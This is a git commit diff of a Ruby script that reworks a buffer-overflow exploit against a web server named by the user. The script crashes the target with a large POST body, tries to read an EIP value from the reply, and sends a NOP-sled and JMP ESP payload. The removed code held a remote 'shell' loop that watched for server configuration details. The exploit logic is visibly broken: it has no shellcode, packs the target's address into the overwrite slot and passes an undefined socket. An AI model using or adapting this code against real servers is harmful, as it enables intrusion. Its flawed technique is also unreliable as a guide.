e3641060bb3a5cdf464be66ea378b1f645a1ea7b
eaglecoffeDev <148896168+eaglecoffeDev@users.noreply.github.com>
2023-12-15 09:00:42 +0100

    Apache.rb

--- Apache.rb
+++ Apache.rb
@@ -2,11 +2,12 @@ require 'socket'
 require 'ipaddr'
 
 # Constants
-APACHE_BANNER = "Apache/"
 EIP_OFFSET = 62
+NOP_SLED_LENGTH = 16
+MAX_BUFFER_SIZE = 5000
 
 def custom_recv_until(s, delimiter)
-  data = ""
+  data = ''
   loop do
     chunk = s.recv(1)
     break unless chunk
@@ -16,32 +17,49 @@ def custom_recv_until(s, delimiter)
   data
 end
 
-def send_payload(s, ip, port)
-  # NOP sled
-  nop_sled = "\x90" * 16
+def generate_payload(target_host, target_port, jmp_esp)
+  nop_sled = "\x90" * NOP_SLED_LENGTH
 
-  # JMP ESP (ROP NOP)
-  jmp_esp = "\xff\xe4"
+  payload = "A" * EIP_OFFSET + [IPAddr.new(target_host).to_i].pack('N') + [target_port].pack('n') + nop_sled + jmp_esp
+  payload
+end
+
+def find_jmp_esp(target_host, target_port)
+  buffer = 'A' * MAX_BUFFER_SIZE
 
   begin
-    # Resolve the domain name to an IP address
-    target_host = IPSocket.getaddress(ip)
-    target_port = port.to_i
-
-    # Set up the connection
     s = TCPSocket.new(target_host, target_port)
-
-    # Send the malicious HTTP request
     s.puts("POST / HTTP/1.1\r\n")
-    s.puts("Host: #{ip}\r\n")
+    s.puts("Host: #{target_host}\r\n")
     s.puts("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n")
     s.puts("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
     s.puts("Connection: close\r\n")
+    s.puts("Content-Length: #{buffer.bytesize}\r\n")
+    s.puts("\r\n")
+    s.write(buffer)
 
-    # Create the buffer overflow payload
-    payload = "A" * EIP_OFFSET + [IPAddr.new(target_host).to_i].pack("N") + [target_port].pack("n") + nop_sled + jmp_esp
+    crash_point = custom_recv_until(s, "Error")
+    # Extract EIP value from the crash report
+    eip_value = crash_point.scan(/EIP:(\S+)/).flatten.first
 
-    # Send the payload
+    s&.close
+
+    return eip_value
+  rescue Exception => e
+    puts "Error occurred while finding jmp esp: #{e}"
+  end
+end
+
+def send_payload(s, target_host, target_port, jmp_esp)
+  begin
+    s = TCPSocket.new(target_host, target_port)
+    payload = generate_payload(target_host, target_port, jmp_esp)
+
+    s.puts("POST / HTTP/1.1\r\n")
+    s.puts("Host: #{target_host}\r\n")
+    s.puts("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n")
+    s.puts("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
+    s.puts("Connection: close\r\n")
     s.puts("Content-Length: #{payload.bytesize}\r\n")
     s.puts("\r\n")
     s.write(payload)
@@ -53,41 +71,18 @@ def send_payload(s, ip, port)
 end
 
 def main
-  print "Enter URL or IP: "
-  ip = gets.chomp
-  print "Enter port: "
-  port = gets.chomp
+  print 'Enter URL or IP: '
+  target_host = gets.chomp
+  print 'Enter port: '
+  target_port = gets.chomp.to_i
 
-  begin
-    # Set up the socket
-    s = TCPSocket.new(ip, port)
+  jmp_esp = find_jmp_esp(target_host, target_port)
 
-    # Send the payload
-    send_payload(s, ip, port.to_i)
-
-    # Interact with the shell
-    loop do
-      print "Shell> "
-      command = gets.chomp
-      break if command.downcase == "exit"
-
-      # Send the command to the target
-      s.puts("#{command}\n")
-
-      # Receive the response
-      response = custom_recv_until(s, "\n")
-      print response.force_encoding('UTF-8')
-
-      # If the response contains sensitive information, display it
-      if response.include?("SERVER_ADMIN") || response.include?("SERVER_NAME")
-        puts "[+] Sensitive information detected!"
-        print response.force_encoding('UTF-8')
-      end
-    end
-  rescue Exception => e
-    puts "Error occurred: #{e}"
-  ensure
-    s&.close
+  if jmp_esp
+    puts "JMP ESP found at address: #{jmp_esp}"
+    send_payload(s, target_host, target_port, [jmp_esp].pack('H*'))
+  else
+    puts "Failed to find JMP ESP address."
   end
 end
 
